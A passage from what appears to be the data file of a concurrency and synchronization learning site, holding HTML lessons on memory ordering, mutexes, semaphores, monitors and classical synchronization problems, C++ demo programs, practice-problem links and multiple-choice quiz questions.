Order</th><th>Guarantee</th><th>Performance</th><th>Use Case</th></tr><tr><td><code>memory_order_relaxed</code></td><td>Atomicity only, no ordering</td><td>Fastest</td><td>Counters, statistics</td></tr><tr><td><code>memory_order_acquire</code></td><td>No reads/writes move before this load</td><td>Moderate</td><td>Lock acquisition</td></tr><tr><td><code>memory_order_release</code></td><td>No reads/writes move after this store</td><td>Moderate</td><td>Lock release, publishing data</td></tr><tr><td><code>memory_order_seq_cst</code></td><td>Total global order (default)</td><td>Slowest</td><td>When in doubt</td></tr></table><div class="learn-code">atomic&lt;bool&gt; ready{false};\nint data = 0;\n\n// Producer:\ndata = 42;                                    // regular write\nready.store(true, memory_order_release);       // publish\n\n// Consumer:\nwhile (!ready.load(memory_order_acquire)) {}   // wait\ncout &lt;&lt; data;                                  // guaranteed to see 42</div><div class="learn-tip"><b>Tip:</b> The acquire-release pair creates a <b>happens-before</b> relationship: everything written before the release is visible after the acquire. This is the fundamental building block of lock-free programming.</div></div><div class="learn-section"><div class="learn-h">Common Threading Bugs</div><ul class="learn-list"><li><b>ABA Problem:</b> A lock-free algorithm reads value A, another thread changes it to B then back to A, and the first thread\'s CAS succeeds incorrectly. Fix: use tagged/versioned pointers.</li><li><b>Priority Inversion:</b> A high-priority thread waits for a low-priority thread that is preempted by a medium-priority thread. Fix: priority inheritance or priority ceiling.</li><li><b>False Sharing:</b> Two threads modify different variables that happen to be on the same cache line, causing constant cache invalidation. Fix: pad structures to cache-line boundaries (64 bytes).</li><li><b>Thundering Herd:</b> Many threads wake up on a single event (e.g., condition_variable notify_all), but only one can proceed. Fix: use notify_one where possible.</li><li><b>Lock Convoy:</b> Multiple threads contend on a lock, and the OS scheduling quantum causes a chain reaction of context switches. Fix: use non-blocking algorithms or lock-free data structures.</li></ul></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Pattern</th><th>Mechanism</th><th>Contention</th><th>Best For</th></tr><tr><td>Mutex + condvar</td><td>Blocking</td><td>High under contention</td><td>General-purpose, moderate contention</td></tr><tr><td>Spinlock</td><td>Busy-wait</td><td>CPU waste under contention</td><td>Very short critical sections</td></tr><tr><td>Read-Write Lock</td><td>Shared/exclusive</td><td>Write starvation risk</td><td>Read-heavy workloads</td></tr><tr><td>Lock-free (CAS)</td><td>Atomic compare-and-swap</td><td>Retry under contention</td><td>High-throughput, latency-sensitive</td></tr><tr><td>Wait-free</td><td>Bounded atomic ops</td><td>None (guaranteed progress)</td><td>Hard real-time, highest correctness bar</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>volatile ≠ atomic:</b> In C/C++, volatile prevents compiler optimization but provides <b>no</b> atomicity or memory ordering guarantees. Use <code>std::atomic</code> for thread-safe access.</li><li><b>std::shared_ptr is not thread-safe:</b> The reference count is atomic, but the pointer itself is not. Two threads reading/writing the same shared_ptr instance need synchronization.</li><li><b>Condition variable spurious wakeup:</b> Always check the condition in a while loop, not an if statement, because threads can wake without being signaled.</li><li><b>Lock ordering:</b> To prevent deadlocks, always acquire multiple locks in a consistent global order. Use <code>std::lock()</code> to atomically acquire multiple mutexes.</li><li><b>Thread starvation vs deadlock:</b> Starvation means a thread makes no progress due to scheduling; deadlock means threads are permanently blocked waiting for each other. Both are liveness failures.</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between a data race and a race condition?</b><br>A: A data race is unsynchronized concurrent access to the same memory (undefined behavior in C++). A race condition is a logical timing bug where correctness depends on execution order. You can have race conditions even with proper locking.</p><p class="learn-p"><b>Q2: Explain false sharing and how to fix it.</b><br>A: False sharing occurs when threads modify different variables on the same cache line (typically 64 bytes), causing constant invalidation traffic between cores. Fix: pad or align variables to cache-line boundaries using alignas(64) or __attribute__((aligned(64))).</p><p class="learn-p"><b>Q3: Why is double-checked locking broken without memory barriers?</b><br>A: The CPU/compiler may reorder the pointer assignment before the constructor completes. Another thread sees a non-null pointer but accesses an uninitialized object. In C++11+, use std::call_once or a function-local static (guaranteed thread-safe).</p><p class="learn-p"><b>Q4: What is the ABA problem?</b><br>A: In lock-free algorithms using CAS, a value changes from A to B and back to A. The CAS succeeds because it sees A, but the underlying data structure has changed. Fix: use a version counter or tagged pointer alongside the value.</p><p class="learn-p"><b>Q5: When would you choose a spinlock over a mutex?</b><br>A: Spinlocks are better when the critical section is very short (nanoseconds), contention is low, and threads won\'t be preempted while spinning (e.g., kernel code or pinned threads). For longer critical sections, a mutex avoids wasting CPU cycles.</p></div>',
          code: `// Concurrency Patterns in C++
#include <iostream>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <vector>
using namespace std;

// ===== Producer-Consumer with Bounded Buffer =====
template<typename T>
class BoundedBuffer {
    queue<T> buffer;
    int capacity;
    mutex mtx;
    condition_variable notFull, notEmpty;
public:
    BoundedBuffer(int cap) : capacity(cap) {}

    void produce(T item) {
        unique_lock<mutex> lock(mtx);
        notFull.wait(lock, [this]{ return buffer.size() < capacity; });
        buffer.push(item);
        notEmpty.notify_one();
    }

    T consume() {
        unique_lock<mutex> lock(mtx);
        notEmpty.wait(lock, [this]{ return !buffer.empty(); });
        T item = buffer.front();
        buffer.pop();
        notFull.notify_one();
        return item;
    }
};

// ===== Lock-Free Counter using Atomics =====
class LockFreeCounter {
    atomic<int> count{0};
public:
    void increment() {
        count.fetch_add(1, memory_order_relaxed);
    }
    int get() {
        return count.load(memory_order_relaxed);
    }
};

// ===== False Sharing Demo =====
struct alignas(64) PaddedCounter {
    atomic<int> value{0};
};

struct UnpaddedCounter {
    atomic<int> value{0};
};

// Without padding: counters on same cache line = false sharing
UnpaddedCounter badCounters[4];
// With padding: each counter on its own cache line
PaddedCounter goodCounters[4];

// ===== Thread-Safe Singleton (C++11 way) =====
class Singleton {
public:
    static Singleton& getInstance() {
        static Singleton instance;  // Thread-safe in C++11+
        return instance;
    }
    void doWork() { cout << "Singleton working" << endl; }
private:
    Singleton() = default;
    Singleton(const Singleton&) = delete;
    Singleton& operator=(const Singleton&) = delete;
};

int main() {
    // Demo 1: Producer-Consumer
    cout << "=== Producer-Consumer ===" << endl;
    BoundedBuffer<int> buf(5);

    thread producer([&]() {
        for (int i = 0; i < 10; i++) {
            buf.produce(i);
            cout << "Produced: " << i << endl;
        }
    });
    thread consumer([&]() {
        for (int i = 0; i < 10; i++) {
            int val = buf.consume();
            cout << "Consumed: " << val << endl;
        }
    });
    producer.join(); consumer.join();

    // Demo 2: Lock-free counter
    cout << "\\n=== Lock-Free Counter ===" << endl;
    LockFreeCounter counter;
    vector<thread> threads;
    for (int i = 0; i < 4; i++) {
        threads.emplace_back([&]() {
            for (int j = 0; j < 100000; j++)
                counter.increment();
        });
    }
    for (auto& t : threads) t.join();
    cout << "Final count: " << counter.get()
         << " (expected 400000)" << endl;

    // Demo 3: Singleton
    cout << "\\n=== Singleton ===" << endl;
    Singleton::getInstance().doWork();

    return 0;
}`,
          problems: [
            ['Print In Order (LeetCode 1114)', 'https://leetcode.com/problems/print-in-order/', 'Easy'],
            ['Print FooBar Alternately (LeetCode 1115)', 'https://leetcode.com/problems/print-foobar-alternately/', 'Medium'],
            ['The Dining Philosophers (LeetCode 1226)', 'https://leetcode.com/problems/the-dining-philosophers/', 'Medium'],
            ['Print Zero Even Odd (LeetCode 1116)', 'https://leetcode.com/problems/print-zero-even-odd/', 'Medium'],
            ['Fizz Buzz Multithreaded (LeetCode 1195)', 'https://leetcode.com/problems/fizz-buzz-multithreaded/', 'Medium'],
          ],
          mcqs: [
            {q: 'What is a data race in C++?', o: ['A race condition with locks', 'Unsynchronized concurrent access where at least one is a write', 'Two threads reading the same variable', 'A deadlock between two threads'], a: 1},
            {q: 'What does memory_order_relaxed guarantee?', o: ['Total ordering of all operations', 'Atomicity only, no ordering guarantees', 'Acquire-release semantics', 'Sequential consistency'], a: 1},
            {q: 'What causes false sharing?', o: ['Two threads sharing the same lock', 'Two threads modifying variables on the same cache line', 'Two threads reading the same file', 'A variable shared without volatile keyword'], a: 1},
            {q: 'In C++, volatile provides which thread-safety guarantee?', o: ['Atomicity', 'Memory ordering', 'Both atomicity and ordering', 'Neither atomicity nor ordering'], a: 3},
            {q: 'What is the fix for the ABA problem in lock-free algorithms?', o: ['Use a mutex instead', 'Add a version counter to the CAS value', 'Use memory_order_seq_cst', 'Disable interrupts during CAS'], a: 1},
            {q: 'Which condition_variable usage pattern prevents spurious wakeups?', o: ['Using if to check the condition', 'Using while loop to check the condition', 'Using notify_all instead of notify_one', 'Using a timeout on wait'], a: 1},
          ],
        },
      ],
    },

    // ===== TAB: SYNCHRONIZATION =====
    {
      id: 'sync', t: 'Synchronization',
      topics: [
        // ----- Topic 0: Mutex, Semaphores & Monitors -----
        {
          t: 'Mutex, Semaphores & Monitors',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Imagine a banking system where two ATM transactions simultaneously read a balance of $1000, each deduct $600, and write back $400. The bank lost $200 because of a race condition. Synchronization primitives prevent such catastrophic data corruption in any concurrent system.</p></div><div class="learn-section"><div class="learn-h">The Critical Section Problem</div><p class="learn-p">When multiple processes or threads access <b>shared data concurrently</b>, the outcome depends on the order of execution &mdash; this is called a <b>race condition</b>. The segment of code where shared data is accessed is called the <b>critical section</b>.</p><p class="learn-p">A solution to the critical section problem must satisfy three conditions:</p><ol class="learn-list"><li><b>Mutual Exclusion:</b> If process P<sub>i</sub> is executing in its critical section, no other process can be in its critical section.</li><li><b>Progress:</b> If no process is in the critical section and some processes wish to enter, only those processes not in their remainder section can participate in the decision, and the decision cannot be postponed indefinitely.</li><li><b>Bounded Waiting:</b> There exists a bound on the number of times other processes can enter their critical sections after a process has requested entry and before that request is granted.</li></ol></div><div class="learn-section"><div class="learn-h">Mutex (Mutual Exclusion Lock)</div><p class="learn-p">A <b>mutex</b> is the simplest synchronization tool. It is a lock that a thread must acquire before entering a critical section and release when leaving. Only <b>one thread</b> can hold the mutex at a time.</p><div class="learn-code">pthread_mutex_t lock;\npthread_mutex_init(&amp;lock, NULL);\n\n// Thread code:\npthread_mutex_lock(&amp;lock);    // Acquire (blocks if locked)\n// ... critical section ...\npthread_mutex_unlock(&amp;lock);  // Release</div><p class="learn-p">Key properties:</p><ul class="learn-list"><li><b>Binary:</b> Only two states &mdash; locked or unlocked.</li><li><b>Ownership:</b> Only the thread that locked the mutex can unlock it.</li><li><b>Blocking:</b> If a thread tries to lock an already-locked mutex, it is put to sleep (blocked) until the mutex is released.</li></ul><div class="learn-tip"><b>Tip:</b> A <b>spinlock</b> is a variant of mutex where the waiting thread <b>busy-waits</b> (spins in a loop) instead of blocking. Spinlocks are useful on multicore systems for very short critical sections because the overhead of sleeping and waking is avoided.</div></div><div class="learn-section"><div class="learn-h">Peterson\'s Algorithm</div><p class="learn-p"><b>Peterson\'s Algorithm</b> is a classic <b>software-only</b> solution to the critical section problem for two processes. It uses two shared variables:</p><div class="learn-code">bool flag[2] = {false, false};  // flag[i] = true means process i wants to enter\nint turn;                       // whose turn it is to enter\n\n// Process i (where j = 1 - i):\nflag[i] = true;        // I want to enter\nturn = j;              // But I give the other process a chance\nwhile (flag[j] &amp;&amp; turn == j)\n    ;  // busy wait\n// --- critical section ---\nflag[i] = false;       // I\'m done</div><p class="learn-p">Peterson\'s satisfies all three requirements: <b>mutual exclusion</b> (both flags can be true, but turn breaks the tie), <b>progress</b> (a process not wanting to enter doesn\'t block others), and <b>bounded waiting</b> (at most one entry by the other before the waiting process gets in).</p><div class="learn-warn"><b>Warning:</b> Peterson\'s algorithm is <b>not correct on modern hardware</b> without memory barriers. CPUs reorder memory operations, so flag and turn updates may not be visible to the other core in the expected order. Use <code>atomic</code> variables or explicit fences in practice.</div></div><div class="learn-section"><div class="learn-h">Hardware Support for Synchronization</div><p class="learn-p">Software-only solutions like Peterson\'s are impractical on modern multicore CPUs. Instead, hardware provides atomic instructions:</p><ul class="learn-list"><li><b>Test-and-Set (TAS):</b> Atomically sets a memory location to true and returns the old value. Used to build spinlocks.</li><li><b>Compare-and-Swap (CAS):</b> Atomically compares a memory location to an expected value, and if equal, replaces it with a new value. Returns whether the swap succeeded. The foundation of lock-free programming.</li><li><b>Fetch-and-Add:</b> Atomically adds a value and returns the old value. Used for counters and ticket locks.</li></ul><div class="learn-code">// Test-and-Set spinlock:\nbool lock = false;\nvoid acquire() {\n    while (test_and_set(&amp;lock))  // spins while lock was true\n        ;                        // busy wait\n}\nvoid release() { lock = false; }\n\n// Ticket lock (fair spinlock using fetch-and-add):\natomic&lt;int&gt; next_ticket = 0, now_serving = 0;\nvoid acquire() {\n    int my_ticket = fetch_and_add(&amp;next_ticket, 1);\n    while (now_serving != my_ticket) ;  // spin\n}\nvoid release() { now_serving++; }</div><div class="learn-tip"><b>Tip:</b> Ticket locks provide <b>FIFO fairness</b> (bounded waiting), which basic TAS spinlocks do not. But they suffer from cache contention because all threads spin on the same variable (now_serving). MCS and CLH locks solve this by giving each thread its own spin variable.</div></div><div class="learn-section"><div class="learn-h">Semaphores</div><p class="learn-p">A <b>semaphore</b> is a more general synchronization tool introduced by Dijkstra. It is an integer variable accessed only through two atomic operations:</p><ul class="learn-list"><li><b>wait(S)</b> (also called <b>P()</b> or <b>down()</b>): Decrement S. If S &lt; 0, block the calling process.</li><li><b>signal(S)</b> (also called <b>V()</b> or <b>up()</b>): Increment S. If S &le; 0, wake up a blocked process.</li></ul><div class="learn-code">// Pseudocode for semaphore operations\nwait(S) {\n    S--;\n    if (S &lt; 0) {\n        // Add this process to the waiting queue\n        block();\n    }\n}\n\nsignal(S) {\n    S++;\n    if (S &lt;= 0) {\n        // Remove a process from the waiting queue\n        wakeup(P);\n    }\n}</div><p class="learn-p"><b>Two types of semaphores:</b></p><table class="learn-table"><tr><th>Type</th><th>Initial Value</th><th>Purpose</th></tr><tr><td>Binary Semaphore</td><td>0 or 1</td><td>Mutual exclusion (similar to mutex)</td></tr><tr><td>Counting Semaphore</td><td>N (any non-negative integer)</td><td>Control access to a resource with N instances</td></tr></table><div class="learn-warn"><b>Warning:</b> A binary semaphore is <b>not identical</b> to a mutex! Key differences: (1) A semaphore has no concept of ownership &mdash; any thread can signal, not just the one that waited. (2) A semaphore can be used for <b>signaling</b> (one thread signals another), while a mutex is strictly for mutual exclusion.</div></div><div class="learn-section"><div class="learn-h">Semaphore Use Cases</div><p class="learn-p"><b>1. Mutual Exclusion:</b></p><div class="learn-code">semaphore mutex = 1;\n\nwait(mutex);\n// critical section\nsignal(mutex);</div><p class="learn-p"><b>2. Ordering/Signaling:</b> Ensure statement S2 in process P2 executes after S1 in P1:</p><div class="learn-code">semaphore sync = 0;\n\n// Process P1:        // Process P2:\nS1;                   wait(sync);\nsignal(sync);         S2;</div><p class="learn-p"><b>3. Resource Counting:</b> Control access to a pool of N identical resources:</p><div class="learn-code">semaphore pool = N;  // N available resources\n\nwait(pool);          // Acquire a resource\n// use resource\nsignal(pool);        // Release resource</div></div><div class="learn-section"><div class="learn-h">Monitors</div><p class="learn-p">A <b>monitor</b> is a high-level synchronization construct that encapsulates shared data, operations on that data, and synchronization into a single module. Only <b>one process can be active inside the monitor at a time</b> &mdash; mutual exclusion is guaranteed by the compiler/language runtime.</p><p class="learn-p">Monitors use <b>condition variables</b> for synchronization beyond mutual exclusion. A condition variable supports two operations:</p><ul class="learn-list"><li><b>wait(c):</b> The calling process is suspended and placed on the waiting queue for condition c. The monitor lock is released.</li><li><b>signal(c):</b> Resumes one process waiting on condition c. If no process is waiting, the signal has no effect (unlike semaphores where the value is incremented).</li></ul><p class="learn-p"><b>Hoare vs. Mesa Monitors:</b></p><table class="learn-table"><tr><th>Hoare Monitor</th><th>Mesa Monitor</th></tr><tr><td>signal() immediately switches to the woken process</td><td>signal() places the woken process in the ready queue; signaler continues</td></tr><tr><td>Woken process runs next</td><td>Woken process must recheck the condition (use while loop)</td></tr><tr><td>Stronger guarantee but harder to implement</td><td>Simpler to implement; used in Java, pthreads</td></tr></table><div class="learn-tip"><b>Tip:</b> In Java, every object is a monitor. The <code>synchronized</code> keyword provides mutual exclusion, and <code>wait()</code>/<code>notify()</code>/<code>notifyAll()</code> provide condition variable functionality. Always use <code>while</code> loops (not <code>if</code>) when checking conditions because of Mesa semantics.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Primitive</th><th>Type</th><th>Ownership</th><th>Count</th><th>Use Case</th></tr><tr><td>Mutex</td><td>Locking</td><td>Yes (only locker unlocks)</td><td>Binary (0/1)</td><td>Protecting critical sections</td></tr><tr><td>Binary Semaphore</td><td>Signaling/Locking</td><td>No (any thread can signal)</td><td>Binary (0/1)</td><td>Mutual exclusion or signaling</td></tr><tr><td>Counting Semaphore</td><td>Resource counting</td><td>No</td><td>0 to N</td><td>Limiting concurrent access</td></tr><tr><td>Monitor</td><td>High-level construct</td><td>Implicit (compiler-enforced)</td><td>N/A</td><td>Encapsulating shared data</td></tr><tr><td>Spinlock</td><td>Busy-wait locking</td><td>Yes</td><td>Binary</td><td>Very short critical sections in kernel</td></tr><tr><td>Recursive Mutex</td><td>Locking</td><td>Yes</td><td>Count of re-entries</td><td>Thread may re-enter its own lock</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Binary semaphore is not a mutex:</b> A mutex has ownership (only the locking thread can unlock). A semaphore has no ownership; any thread can signal().</li><li><b>Forgetting to release a lock:</b> If a thread crashes without releasing a mutex, all other threads are permanently blocked. Use RAII patterns (C++ lock_guard).</li><li><b>Spinlock on a single-core system:</b> On a single core, spinning wastes the entire CPU. Spinlocks should only be used on multicore systems.</li><li><b>Mesa vs Hoare semantics:</b> In Mesa monitors (Java, pthreads), a signaled thread may not run next. Always use <code>while</code>, never <code>if</code>, around condition variable waits.</li><li><b>Deadlock with multiple locks:</b> Acquiring locks in inconsistent order across threads causes deadlock. Establish a global lock ordering.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Primitive</th><th>Lock/Unlock Cost</th><th>Contended Cost</th><th>Scalability</th></tr><tr><td>Mutex (uncontended)</td><td>~25 ns (atomic CAS)</td><td>~1-10 &mu;s (sleep/wake)</td><td>Good for moderate contention</td></tr><tr><td>Spinlock (uncontended)</td><td>~5 ns (atomic exchange)</td><td>100% CPU per spinning thread</td><td>Poor under high contention</td></tr><tr><td>Semaphore</td><td>~25-50 ns</td><td>~1-10 &mu;s</td><td>Good</td></tr><tr><td>Read-Write Lock (read)</td><td>~30 ns</td><td>Low under read-heavy load</td><td>Excellent for read-heavy</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What are the three requirements for a correct critical section solution?</b><br>A: Mutual exclusion (only one thread in CS at a time), Progress (decision cannot be postponed indefinitely), and Bounded waiting (a bound exists on how many times others can enter before a waiting thread gets access).</p><p class="learn-p"><b>Q2: Difference between a mutex and a binary semaphore?</b><br>A: A mutex has ownership: only the locking thread can unlock it. A binary semaphore has no ownership. A mutex also supports priority inheritance.</p><p class="learn-p"><b>Q3: Why must condition variable checks use while loops?</b><br>A: In Mesa-style monitors, a signaled thread may not run next. Another thread could change the condition. Spurious wakeups are also possible. The while loop re-checks after each wakeup.</p><p class="learn-p"><b>Q4: When would you use a spinlock over a mutex?</b><br>A: When the critical section is extremely short and you are on a multicore system. The cost of sleeping and waking (mutex) exceeds the cost of briefly spinning.</p><p class="learn-p"><b>Q5: What is a recursive mutex?</b><br>A: A recursive mutex allows the same thread to lock it multiple times without deadlocking. It maintains a count; released only when the count reaches zero.</p><p class="learn-p"><b>Q6: Why doesn\'t Peterson\'s algorithm work on modern hardware without modification?</b><br>A: Modern CPUs reorder memory operations for performance. Without memory barriers, one process may not see the other\'s flag/turn updates in the correct order, breaking mutual exclusion. Use atomic variables or explicit fence instructions.</p><p class="learn-p"><b>Q7: Compare Test-and-Set spinlocks vs ticket locks.</b><br>A: TAS spinlocks are simple but unfair &mdash; a thread can repeatedly lose the race. Ticket locks use fetch-and-add to assign FIFO order, guaranteeing bounded waiting. However, ticket locks have higher cache contention since all threads spin on the same now_serving variable.</p></div>',
          code: `// Synchronization Primitives Demo in C++ (pthreads)
#include <iostream>
#include <pthread.h>
#include <semaphore.h>
#include <unistd.h>
using namespace std;

// ============ MUTEX DEMO ============
pthread_mutex_t mtx = PTHREAD_MUTEX_INITIALIZER;
int bankBalance = 1000;

void* withdraw(void* arg) {
    int amount = *(int*)arg;
    pthread_mutex_lock(&mtx);
    // Critical section
    if (bankBalance >= amount) {
        usleep(1000); // Simulate processing
        bankBalance -= amount;
        cout << "Withdrew " << amount << ", Balance: " << bankBalance << endl;
    } else {
        cout << "Insufficient funds for " << amount << endl;
    }
    pthread_mutex_unlock(&mtx);
    return NULL;
}

// ============ SEMAPHORE DEMO ============
// Simulates a parking lot with limited spots
sem_t parkingSpots;
const int MAX_SPOTS = 3;

void* parkCar(void* arg) {
    int carId = *(int*)arg;
    cout << "Car " << carId << " waiting for a spot..." << endl;
    sem_wait(&parkingSpots);  // Acquire a spot (counting semaphore)
    cout << "Car " << carId << " parked!" << endl;
    usleep(500000); // Simulate parking duration
    cout << "Car " << carId << " leaving." << endl;
    sem_post(&parkingSpots);  // Release the spot
    return NULL;
}

// ============ ORDERING WITH SEMAPHORE ============
sem_t orderSem;

void* firstTask(void* arg) {
    cout << "First task executing..." << endl;
    usleep(200000); // Simulate work
    cout << "First task done. Signaling second task." << endl;
    sem_post(&orderSem); // Signal that first task is done
    return NULL;
}

void* secondTask(void* arg) {
    sem_wait(&orderSem); // Wait for first task to finish
    cout << "Second task executing (guaranteed after first)." << endl;
    return NULL;
}

int main() {
    // --- Mutex Demo ---
    cout << "=== Mutex Demo (Bank Withdrawals) ===" << endl;
    pthread_t t1, t2;
    int amt1 = 700, amt2 = 500;
    pthread_create(&t1, NULL, withdraw, &amt1);
    pthread_create(&t2, NULL, withdraw, &amt2);
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    cout << "Final Balance: " << bankBalance << endl;

    // --- Counting Semaphore Demo ---
    cout << "\\n=== Counting Semaphore (Parking Lot) ===" << endl;
    sem_init(&parkingSpots, 0, MAX_SPOTS);
    const int NUM_CARS = 6;
    pthread_t cars[NUM_CARS];
    int carIds[NUM_CARS];
    for (int i = 0; i < NUM_CARS; i++) {
        carIds[i] = i + 1;
        pthread_create(&cars[i], NULL, parkCar, &carIds[i]);
    }
    for (int i = 0; i < NUM_CARS; i++) {
        pthread_join(cars[i], NULL);
    }
    sem_destroy(&parkingSpots);

    // --- Ordering Demo ---
    cout << "\\n=== Semaphore Ordering Demo ===" << endl;
    sem_init(&orderSem, 0, 0);
    pthread_t tf, ts;
    pthread_create(&ts, NULL, secondTask, NULL); // Start second first
    pthread_create(&tf, NULL, firstTask, NULL);
    pthread_join(tf, NULL);
    pthread_join(ts, NULL);
    sem_destroy(&orderSem);

    pthread_mutex_destroy(&mtx);
    return 0;
}`,
          problems: [
            ['Mutex vs Semaphore', 'https://www.geeksforgeeks.org/mutex-vs-semaphore/', 'Easy'],
            ['Print in Order (LeetCode 1114)', 'https://leetcode.com/problems/print-in-order/', 'Easy'],
            ['Building H2O (LeetCode 1117)', 'https://leetcode.com/problems/building-h2o/', 'Medium'],
            ['Peterson\'s Algorithm Implementation', 'https://www.geeksforgeeks.org/petersons-algorithm-in-process-synchronization/', 'Medium'],
            ['Fizz Buzz Multithreaded (LeetCode 1195)', 'https://leetcode.com/problems/fizz-buzz-multithreaded/', 'Medium'],
            ['Semaphore Implementation', 'https://www.geeksforgeeks.org/semaphores-in-process-synchronization/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which of the following is NOT a requirement for a correct critical section solution?', o: ['Mutual Exclusion', 'Progress', 'Bounded Waiting', 'Fairness'], a: 3},
            {q: 'What is the key difference between a binary semaphore and a mutex?', o: ['Binary semaphore can only be 0 or 1', 'Mutex has ownership semantics; any thread can signal a semaphore', 'They are identical in every way', 'Mutex can count above 1'], a: 1},
            {q: 'In Mesa-style monitors, why must the condition be checked in a while loop instead of an if statement?', o: ['Because signal() does not guarantee the woken thread runs next', 'Because the monitor may have multiple entry points', 'Because the compiler requires it', 'Because if statements cannot be used inside monitors'], a: 0},
            {q: 'Why does Peterson\'s algorithm fail on modern hardware without memory barriers?', o: ['It requires three processes', 'CPU reorders memory operations, breaking visibility guarantees', 'It only works with semaphores', 'Modern CPUs lack boolean support'], a: 1},
            {q: 'What does the Test-and-Set instruction do atomically?', o: ['Reads and increments a value', 'Sets a memory location to true and returns the old value', 'Compares and conditionally swaps two values', 'Locks and unlocks a mutex'], a: 1},
            {q: 'What advantage does a ticket lock have over a basic TAS spinlock?', o: ['Lower latency', 'FIFO fairness (bounded waiting)', 'No atomic instructions needed', 'Works on single-core systems'], a: 1},
          ],
        },
        // ----- Topic 1: Classical Synchronization Problems -----
        {
          t: 'Classical Synchronization Problems',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">The Producer-Consumer pattern appears in every message queue (Kafka, RabbitMQ), I/O buffer, and logging system. The Readers-Writers pattern is the foundation of database concurrency control. The Dining Philosophers problem models any system where multiple agents compete for shared resources. Mastering these gives you reusable solutions for real-world concurrent programming.</p></div><div class="learn-section"><div class="learn-h">Producer-Consumer Problem (Bounded Buffer)</div><p class="learn-p">The <b>Producer-Consumer</b> problem is a classic synchronization problem. A <b>producer</b> generates data and places it in a buffer; a <b>consumer</b> removes data from the buffer. The buffer has a <b>fixed size N</b>.</p><p class="learn-p">Constraints:</p><ul class="learn-list"><li>The producer must wait if the buffer is <b>full</b>.</li><li>The consumer must wait if the buffer is <b>empty</b>.</li><li>Only one process can access the buffer at a time (mutual exclusion).</li></ul><p class="learn-p"><b>Solution using semaphores:</b></p><div class="learn-code">semaphore mutex = 1;     // Mutual exclusion for buffer access\nsemaphore empty = N;     // Count of empty slots (initially N)\nsemaphore full  = 0;     // Count of full slots (initially 0)\n\n// Producer:              // Consumer:\nwait(empty);              wait(full);\nwait(mutex);              wait(mutex);\n// add item to buffer     // remove item from buffer\nsignal(mutex);            signal(mutex);\nsignal(full);             signal(empty);</div><div class="learn-warn"><b>Warning:</b> The order of wait() operations matters! If you swap <code>wait(empty)</code> and <code>wait(mutex)</code> in the producer, a deadlock can occur: the producer holds the mutex but cannot proceed because the buffer is full, and the consumer cannot acquire the mutex to consume an item.</div></div><div class="learn-section"><div class="learn-h">Readers-Writers Problem</div><p class="learn-p">Multiple processes want to access a shared database. <b>Readers</b> only read the data; <b>writers</b> can both read and modify it. The constraints are:</p><ul class="learn-list"><li>Multiple readers can read simultaneously (no conflict).</li><li>Only one writer can write at a time (exclusive access).</li><li>No reader can read while a writer is writing.</li></ul><p class="learn-p"><b>First Readers-Writers Problem (Reader priority):</b> No reader is kept waiting unless a writer has already obtained access. Readers may starve writers.</p><div class="learn-code">semaphore rw_mutex = 1;    // Exclusive access for writers\nsemaphore mutex   = 1;     // Protects read_count\nint read_count = 0;\n\n// Reader:                   // Writer:\nwait(mutex);                 wait(rw_mutex);\nread_count++;                // ... write ...\nif (read_count == 1)         signal(rw_mutex);\n    wait(rw_mutex); // First reader locks out writers\nsignal(mutex);\n// ... read ...\nwait(mutex);\nread_count--;\nif (read_count == 0)\n    signal(rw_mutex); // Last reader unlocks\nsignal(mutex);</div><p class="learn-p"><b>Second Readers-Writers Problem (Writer priority):</b> Once a writer is ready, it gets access as soon as possible. New readers must wait if a writer is waiting. This can starve readers.</p><div class="learn-tip"><b>Tip:</b> The Readers-Writers problem appears frequently in database concurrency control. <b>Read-Write locks</b> (like <code>pthread_rwlock</code> in pthreads or <code>ReadWriteLock</code> in Java) implement this pattern.</div></div><div class="learn-section"><div class="learn-h">Dining Philosophers Problem</div><p class="learn-p">Five philosophers sit around a circular table. Each has a plate of food and a <b>chopstick</b> between each pair. To eat, a philosopher needs <b>both chopsticks</b> (left and right). They alternate between thinking and eating.</p><p class="learn-p"><b>Naive solution (leads to deadlock):</b></p><div class="learn-code">// Philosopher i:\nwait(chopstick[i]);         // Pick up left chopstick\nwait(chopstick[(i+1) % 5]); // Pick up right chopstick\n// ... eat ...\nsignal(chopstick[(i+1) % 5]);\nsignal(chopstick[i]);</div><p class="learn-p">If all five philosophers pick up their left chopstick simultaneously, they all wait for the right chopstick forever &mdash; <b>deadlock</b>!</p><p class="learn-p"><b>Solutions to prevent deadlock:</b></p><ol class="learn-list"><li><b>Allow at most 4 philosophers at the table:</b> Use a semaphore initialized to 4.</li><li><b>Asymmetric solution:</b> Odd-numbered philosophers pick up left first, then right. Even-numbered philosophers pick up right first, then left. This breaks the circular wait.</li><li><b>Use a monitor:</b> A philosopher can pick up chopsticks only if both are available (atomic check-and-grab).</li><li><b>Resource ordering:</b> Always pick up the lower-numbered chopstick first.</li></ol></div><div class="learn-section"><div class="learn-h">Sleeping Barber Problem</div><p class="learn-p">A barbershop has one barber, one barber chair, and N waiting chairs. If there are no customers, the barber sleeps. When a customer arrives, if all chairs are occupied, the customer leaves. Otherwise, the customer sits in a waiting chair (or wakes the barber if sleeping).</p><div class="learn-code">semaphore customers = 0;  // Number of waiting customers\nsemaphore barber   = 0;   // Barber is ready\nsemaphore mutex    = 1;   // Protects the counter\nint waiting = 0;          // Count of waiting customers\n\n// Barber:                  // Customer:\nwhile (true) {              wait(mutex);\n  wait(customers);          if (waiting &lt; N) {\n  wait(mutex);                waiting++;\n  waiting--;                  signal(customers);\n  signal(barber);             signal(mutex);\n  signal(mutex);              wait(barber);\n  // cut hair                 // get haircut\n}      